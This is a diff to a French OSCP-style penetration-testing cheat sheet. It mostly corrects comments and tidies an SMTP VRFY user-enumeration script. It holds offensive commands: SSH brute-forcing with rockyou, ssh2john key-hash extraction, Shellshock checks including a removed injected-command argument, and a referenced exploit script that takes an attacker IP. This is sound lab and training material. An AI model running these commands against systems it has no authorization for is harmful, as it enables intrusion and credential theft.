@@ -568,16 +568,16 @@ curl --list-only 'ftp://anonymous:anonymous@<IP_CIBLE>/'
 <p class="oscp-command-note">Nmap (SSH) : lancer les scripts NSE « ssh-hostkey ».</p>
 
 ```bash
-# Examiner le service SSH
-nmap -p 22 --script=ssh-hostkey <target_ip>
+# Examiner les clés d'hôte annoncées par SSH
+nmap -p 22 --script ssh-hostkey <target_ip>
 
-# Détecter les contournements d'authentification SSH
-nmap -p 22 --script=ssh-auth-methods <target_ip>
+# Énumérer les méthodes d'authentification SSH (ne démontre aucun contournement)
+nmap -p 22 --script ssh-auth-methods <target_ip>
 
 # Tester les mots de passe SSH dans le périmètre autorisé
 nmap -p 22 --script=ssh-brute --script-args userdb=/usr/share/seclists/Usernames/top-usernames-shortlist.txt,passdb=/usr/share/wordlists/rockyou.txt <target_ip>
 
-# Identifier la version SSH
+# Lister les algorithmes SSH2 proposés (ne détermine pas à lui seul la version du serveur)
 nmap -p 22 --script ssh2-enum-algos <IP_CIBLE>
 
 # Examiner les algorithmes SSH anciens
@@ -633,10 +633,10 @@ find "$HOME/.ssh" -type f -name 'id_*' 2>/dev/null
 <p class="oscp-command-note">Préparer une empreinte de clé SSH pour John.</p>
 
 ```bash
-# Sans mot de passe
-ssh2john <private_key_file> > <private_key_file>.hash # id_rsa has no password!
+# Extraire le hash d'une clé privée chiffrée (inutile si elle n'a pas de phrase secrète)
+ssh2john cle_privee > cle_privee.hash
 
-# Utilisateur ou clé incorrects
+# Tester une authentification SSH par clé (un refus peut avoir plusieurs causes)
 ssh <user>@<target_ip> -p <port> -i <private_key_file> # Error message: Permission denied (publickey,password).
 
 ```
@@ -644,19 +644,19 @@ ssh <user>@<target_ip> -p <port> -i <private_key_file> # Error message: Permissi
 <p class="oscp-command-note">Transférer des fichiers via SSH.</p>
 
 ```bash
-# Télécharger un fichier
+# Récupérer un fichier distant vers la machine locale
 scp user@remote_host:/path/to/remote/file /path/to/local/destination
 scp user@192.168.1.10:/etc/config.txt /home/user/config.txt
 
-# Télécharger plusieurs fichiers
+# Récupérer plusieurs fichiers distants vers la machine locale
 scp user@remote_host:/path/to/remote/file1 /path/to/remote/file2 /local/destination/
 scp user@192.168.1.10:/etc/config.txt user@192.168.1.10:/etc/passwd /home/user/
 
-# Télécharger un répertoire Récursivement
+# Récupérer récursivement un répertoire distant
 scp -r user@remote_host:/path/to/remote/directory /local/destination/
 scp -r user@192.168.1.10:/var/www/html /home/user/
 
-# Télécharger un fichier via un port SSH non standard
+# Récupérer un fichier avec un port SSH non standard (option -P majuscule)
 scp -P 2222 user@remote_host:/path/to/remote/file /local/destination/
 scp -P 2222 user@192.168.1.10:/etc/config.txt /home/user/
 
@@ -675,19 +675,19 @@ scp -o StrictHostKeyChecking=no user@192.168.1.10:/etc/config.txt /home/user/
 ```
 
 ```bash
-# Télécharger un fichier unique
+# Envoyer un fichier local vers la machine distante
 scp /path/to/local/file user@remote_host:/path/to/remote/destination
 scp /home/user/config.txt user@192.168.1.10:/etc/config.txt
 
-# Télécharger plusieurs fichiers
+# Envoyer plusieurs fichiers locaux vers la machine distante
 scp /path/to/local/file1 /path/to/local/file2 user@remote_host:/remote/destination/
 scp /home/user/config.txt /home/user/passwd user@192.168.1.10:/etc/
 
-# Télécharger un répertoire
+# Envoyer un répertoire local vers la machine distante
 scp -r /path/to/local/directory user@remote_host:/path/to/remote/destination/
 scp -r /home/user/html user@192.168.1.10:/var/www/
 
-# Télécharger un fichier vers un port spécifique (dans le cas où SSH fonctionne sur un port non par défaut)
+# Envoyer un fichier avec un port SSH non standard (option -P majuscule)
 scp -P 2222 /path/to/local/file user@remote_host:/path/to/remote/destination/
 scp -P 2222 /home/user/config.txt user@192.168.1.10:/etc/config.txt
 
@@ -803,13 +803,13 @@ telnet -l <UTILISATEUR> <IP_CIBLE>
 # Analyse avec les scripts Nmap (NSE)
 nmap --script=smtp-commands,smtp-enum-users,smtp-vuln-cve2010-4344,smtp-vuln-cve2011-1720,smtp-vuln-cve2011-1764 -p 25 <target_ip>
 
-# Interaction entre Netcat et Telnet
+# Dialogue SMTP manuel avec Netcat ou Telnet (les lignes EHLO et VRFY sont à saisir après connexion)
 nc -nv <target_ip> 25
 telnet <target_ip> 25
 EHLO ALL
 VRFY <USER>
 
-# Interaction Example
+# Exemple d'interaction (sortie illustrative)
 kali@kali:~$ nc -nv 192.168.123.8 25
 (UNKNOWN) [192.168.123.8] 25 (smtp) open
 220 mail ESMTP Postfix (Ubuntu)
@@ -842,21 +842,22 @@ import socket
 import sys
 
 if len(sys.argv) != 3:
-    print("Usage: vrfy.py <username> <target_ip>")
-    sys.exit(0)
+    print("Utilisation : python3 vrfy.py <utilisateur> <ip_cible>")
+    sys.exit(1)
 
 # Créer une socket
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
 # Se connecter au serveur
 ip = sys.argv[2]
-connect = s.connect((ip,25))
+s.settimeout(10)
+s.connect((ip, 25))
 
 # Recevoir la bannière
 banner = s.recv(1024)
 print(banner)
 
-# VRFY a user
+# Envoyer une requête SMTP VRFY pour l'utilisateur indiqué
 user = (sys.argv[1]).encode()
 s.send(b'VRFY ' + user + b'\r\n')
 result = s.recv(1024)
@@ -885,8 +886,8 @@ VRFY root
 <p class="oscp-command-note">Nmap (HTTP) : lancer les scripts NSE « http-shellshock ».</p>
 
 ```bash
-# Vérifier si elle est vulnérable
-nmap -sV -p [port] --script http-shellshock --script-args uri=/cgi-bin/user.sh,cmd=echo\;/bin/ls [ip]
+# Vérifier une exposition potentielle à Shellshock sur un CGI du laboratoire
+nmap -sV -p 80 --script http-shellshock --script-args uri=/cgi-bin/user.sh 192.0.2.10
                 
 # Reference: https://gist.github.com/YSSVirus/0978adadbb8827b53065575bb8fbcb25
 python2 shellshock.py <target_ip> <username>@<domain> <attacker_ip> 139 <root>@<domain>
